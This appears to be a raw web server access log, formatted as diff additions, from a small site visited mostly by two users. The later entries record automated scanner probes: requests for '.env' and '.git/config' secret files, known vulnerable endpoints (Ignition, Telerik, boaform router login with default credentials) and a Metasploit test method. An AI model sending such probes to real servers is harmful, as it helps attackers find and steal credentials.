+62.84.32.240 - - [15/May/2023 15:02:55] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:02:58] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:02:58] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:03:18] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:03:19] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:03:32] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:03:32] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:03:46] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:03:46] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:04:02] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:04:02] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:04:23] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:04:23] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:04:37] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:04:37] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:04:44] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:04:44] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:05:36] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:05:36] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:05:58] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:05:58] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:06:13] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:06:13] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:06:27] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:06:27] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:06:39] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:06:39] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:06:57] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:06:57] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:07:15] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:07:15] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:07:26] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:07:27] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:07:29] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:07:29] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:07:55] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:07:55] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:07:58] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:07:58] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:08:00] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:08:00] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:08:02] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:08:03] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:08:31] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:08:31] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:10:35] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:10:36] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:10:37] "GET /favicon.ico HTTP/1.1" 404 -
+62.84.32.240 - - [15/May/2023 15:11:47] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:11:47] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:12:09] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:12:09] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:12:56] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:12:56] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:13:22] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:13:22] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:13:41] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:13:41] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:13:50] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:13:50] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:13:57] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:13:57] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:14:34] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:14:34] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:14:45] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:14:45] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:15:06] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:15:06] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:15:08] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:15:08] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:15:21] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:15:21] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:15:24] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:15:24] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:15:26] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:15:26] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:15:30] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:15:30] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:15:41] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:15:41] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:15:41] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:15:42] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:15:42] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:15:42] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:15:46] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:15:46] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:15:46] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:15:47] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:16:04] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:16:04] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:16:10] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:16:10] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:16:17] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:16:17] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:16:21] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:16:22] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:16:27] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:16:27] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:16:48] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:16:48] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:17:10] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:17:10] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:18:13] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:18:13] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:18:56] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:18:56] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:19:21] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:19:21] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:20:13] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:20:13] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:20:13] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:20:14] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:20:14] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:20:14] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:20:19] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:20:19] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:20:23] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:20:24] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:20:24] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:20:24] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:20:26] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:20:26] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:20:27] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:20:27] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:20:27] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:20:27] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:20:28] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:20:28] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:20:28] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:20:29] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:24:51] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:24:51] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:24:53] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:24:53] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:26:08] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:26:08] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:26:29] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:26:29] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:29:05] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:29:05] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:29:56] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:29:56] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:30:14] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:30:14] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:31:17] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:31:18] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:31:39] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:31:40] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:32:11] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:32:11] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:35:23] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:35:23] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:35:24] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:35:24] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:35:25] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:35:25] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:35:52] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:35:52] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:35:59] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:35:59] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:36:22] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:36:22] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:36:25] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:36:26] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:36:27] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:36:27] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:36:57] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:36:57] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:36:58] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:36:58] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:37:27] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:27] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:37:29] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:29] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:37:32] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:37:32] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:35] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:35] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:37:41] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:37:41] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:43] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:43] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:49] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:49] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:37:50] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:51] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:37:51] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:52] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:37:53] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:53] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:37:54] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:37:55] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:55] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:37:55] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:38:02] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:38:03] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:05] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:05] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:20] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:20] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:38:21] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:21] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:38:22] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:22] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:38:24] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:24] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:38:25] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:25] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:38:26] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:27] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:38:27] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:27] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:38:29] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:38:29] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:40] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:38:40] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:39:15] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:39:15] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:39:22] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:39:22] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:40:29] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:40:29] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:42:28] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:42:29] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:42:31] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:42:32] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:42:56] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:42:56] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:43:11] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:43:11] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:43:15] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:43:15] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:43:22] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:43:22] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:43:38] "GET /files.html HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:43:38] "GET /static/files.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:44:01] "GET /files.html HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:44:01] "GET /static/files.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:44:16] "GET /files.html HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:44:17] "GET /static/files.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:44:41] "GET /files.html HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:44:42] "GET /static/files.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:45:08] "GET /files.html HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:45:08] "GET /static/files.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:45:09] "GET /text.txt HTTP/1.1" 404 -
+62.84.32.240 - - [15/May/2023 15:52:23] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:52:23] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:52:27] "GET /files.html HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:52:28] "GET /static/files.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:52:43] "GET /file1.pdf HTTP/1.1" 404 -
+62.84.32.240 - - [15/May/2023 15:52:45] "GET /file2.pdf HTTP/1.1" 404 -
+62.84.32.240 - - [15/May/2023 15:52:46] "GET /file3.pdf HTTP/1.1" 404 -
+176.222.167.72 - - [15/May/2023 15:52:51] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:52:51] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 15:52:53] "GET /files.html HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:52:53] "GET /static/files.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:53:24] "GET /files.html HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:53:24] "GET /static/files.css HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:53:29] "GET /files.html HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 15:53:29] "GET /static/files.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:54:07] "GET /files.html HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:54:07] "GET /static/files.css HTTP/1.1" 200 -
+66.249.70.220 - - [15/May/2023 16:04:04] "GET /robots.txt HTTP/1.1" 404 -
+66.249.70.223 - - [15/May/2023 16:04:04] "HEAD / HTTP/1.1" 200 -
+45.9.148.96 - - [15/May/2023 16:14:33] "GET /.git/config HTTP/1.1" 404 -
+45.9.148.96 - - [15/May/2023 16:14:39] "GET / HTTP/1.1" 200 -
+45.9.148.96 - - [15/May/2023 16:14:39] "GET /log.txt HTTP/1.1" 404 -
+45.9.148.96 - - [15/May/2023 16:14:44] "GET /login HTTP/1.1" 404 -
+45.9.148.96 - - [15/May/2023 16:14:51] "GET /en-us/test.html HTTP/1.1" 404 -
+45.9.148.96 - - [15/May/2023 16:14:52] "GET /_ignition/execute-solution HTTP/1.1" 404 -
+45.9.148.96 - - [15/May/2023 16:14:56] "GET / HTTP/1.1" 200 -
+45.9.148.96 - - [15/May/2023 16:14:58] "GET / HTTP/1.1" 200 -
+45.9.148.96 - - [15/May/2023 16:14:58] "POST / HTTP/1.1" 405 -
+45.9.148.96 - - [15/May/2023 16:15:10] "GET / HTTP/1.1" 200 -
+45.9.148.96 - - [15/May/2023 16:32:35] "GET / HTTP/1.1" 200 -
+45.9.148.96 - - [15/May/2023 16:40:13] "GET /dzXe-_3Ar2wlciNweiLJDQemu61_IwTlK30NHtCObu8MeE72m HTTP/1.1" 404 -
+45.9.148.96 - - [15/May/2023 16:40:25] code 400, message Bad request version ('HTTP1.1')
+45.9.148.96 - - [15/May/2023 16:40:25] "MSFTEST /dzXe-_3Ar2wlciNweiLJDQemu61_IwTlK30NHtCObu8MeE72m HTTP1.1" HTTPStatus.BAD_REQUEST -
+179.43.177.243 - - [15/May/2023 16:47:35] "GET / HTTP/1.1" 200 -
+20.70.237.249 - - [15/May/2023 16:48:27] "GET /.env HTTP/1.1" 404 -
+20.70.237.249 - - [15/May/2023 16:48:28] "POST / HTTP/1.1" 405 -
+150.129.136.33 - - [15/May/2023 17:07:27] "GET / HTTP/1.1" 200 -
+46.34.193.239 - - [15/May/2023 17:23:42] "GET /favicon.ico HTTP/1.1" 404 -
+182.126.96.188 - - [15/May/2023 18:07:58] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 -
+141.98.6.151 - - [15/May/2023 18:18:11] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+176.222.167.72 - - [15/May/2023 18:32:37] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 18:32:37] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [15/May/2023 18:32:37] "GET /favicon.ico HTTP/1.1" 404 -
+176.222.167.72 - - [15/May/2023 18:32:41] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [15/May/2023 18:32:41] "GET /static/style.css HTTP/1.1" 304 -
+172.104.11.51 - - [15/May/2023 19:01:00] "GET / HTTP/1.1" 200 -
+67.220.86.109 - - [15/May/2023 19:28:14] code 400, message Bad request version ('À\x13À')
+67.220.86.109 - - [15/May/2023 19:28:14] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03î\x14À\x95°Î\x8bØ\x1d\x16Ý Í\x97Js¯ÐµÚ<ÿ\x15\x9dh²MÙHrÎ} K\x98¼\x80\x85\x83£´\x9fl\x8b§\x05z@Ó\x80°\x98B]\x8d7\x8f3®ÿ'jï\\f\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+67.220.86.109 - - [15/May/2023 19:28:15] "GET / HTTP/1.1" 200 -
+87.121.221.49 - - [15/May/2023 19:48:46] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+62.84.32.240 - - [15/May/2023 19:52:49] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 19:52:49] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 19:53:25] "GET /files.html HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 19:53:25] "GET /static/files.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 19:53:36] "GET /file1.pdf HTTP/1.1" 404 -
+62.84.32.240 - - [15/May/2023 19:53:41] "GET /file2.pdf HTTP/1.1" 404 -
+62.84.32.240 - - [15/May/2023 20:03:35] "GET /flag.txt HTTP/1.1" 404 -
+205.210.31.236 - - [15/May/2023 20:04:14] "GET / HTTP/1.0" 200 -
+45.128.232.121 - - [15/May/2023 21:23:05] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+192.241.200.68 - - [15/May/2023 21:36:44] code 400, message Bad request syntax ('MGLNDD_45.146.166.164_80')
+192.241.200.68 - - [15/May/2023 21:36:44] "MGLNDD_45.146.166.164_80" HTTPStatus.BAD_REQUEST -
+85.217.144.217 - - [16/May/2023 01:53:50] "GET /.env HTTP/1.1" 404 -
+85.217.144.217 - - [16/May/2023 01:53:50] "POST / HTTP/1.1" 405 -
+152.89.196.144 - - [16/May/2023 02:06:10] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 02:10:46] "GET /static/files.css HTTP/1.1" 304 -
+85.159.27.200 - - [16/May/2023 02:10:47] "GET /favicon.ico HTTP/1.1" 404 -
+128.1.248.26 - - [16/May/2023 02:13:00] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 -
+171.34.177.231 - - [16/May/2023 02:29:13] "GET / HTTP/1.0" 200 -
+36.106.166.123 - - [16/May/2023 02:29:29] "GET / HTTP/1.1" 200 -
+222.94.140.109 - - [16/May/2023 02:29:33] "GET /favicon.ico HTTP/1.1" 404 -
+34.140.248.32 - - [16/May/2023 03:05:26] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 03:05:44] "GET /favicon.ico HTTP/1.1" 404 -
+85.159.27.200 - - [16/May/2023 03:21:59] "GET / HTTP/1.1" 200 -
+85.159.27.200 - - [16/May/2023 03:22:00] "GET /static/style.css HTTP/1.1" 304 -
